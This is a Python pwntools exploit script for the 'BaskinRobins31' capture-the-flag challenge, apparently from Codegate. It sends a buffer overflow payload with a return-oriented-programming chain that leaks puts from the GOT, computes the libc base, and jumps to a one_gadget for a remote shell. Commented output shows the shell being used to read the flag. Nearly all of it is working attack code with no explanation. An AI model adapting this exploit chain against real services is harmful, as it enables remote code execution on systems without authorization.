from pwn import *

#ELF=ELF("./BaskinRobins31")
libc=ELF("./libc.so.6")

PUTSPLT = 0x4006c0+3
PUTSGOT = 0x000000000602020

main=0x0000000000400A4B

#nc ch41l3ng3s.codegate.kr 3131

pop_rdi_ret=0x0000000000400bc3
pop_rdi_rsi_rdx_ret=0x000000000040087a
mov_eax_0=0x0000000000400b54
offset =184

host = "ch41l3ng3s.codegate.kr"
port = 3131
r = remote(host,port)
#r=process("./BaskinRobins31")
#gdb.attach(r)
pause()
r.recvuntil("3)\n")

r.sendline("2"+"a"*180+"x"*3+p64(pop_rdi_ret)+p64(PUTSGOT)+p64(PUTSPLT)+p64(main))
r.recvuntil(p64(main))
r.recvuntil("\n")
r.recvuntil("\n")
leak=r.recvuntil("\n")
leak=u64(leak[:-1].ljust(8,"\x00"))
print hex(leak)
libc_base=leak-libc.symbols['puts']
one=libc_base+0x45216
xor_rax=libc_base+0x000000000008b8c5
print "one "+hex(one)
pause()
# leak=int(leak,16)
# print "leak put "+hex(leak)

r.sendline("2"+"a"*180+"x"*3+p64(xor_rax)+p64(one))

r.interactive()

# ### This game is similar to the BaskinRobins31 game. ###
# ### The one that take the last match win ###
# There are 31 number(s)
# How many numbers do you want to take ? (1-3)
# 2aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa�\x00\x00\x00\x00\x00\x00aaaaaaaaaaaaaxxx\xa4\x03\x1b\x7f\x00\x00\x16\xa2\x9f\x03\x1b\x7f\x00\x00

# $ ls
# BaskinRobins31
# flag
# $ cat flag
# flag{The Korean name of "Puss in boots" is "My mom is an alien"}
# $  

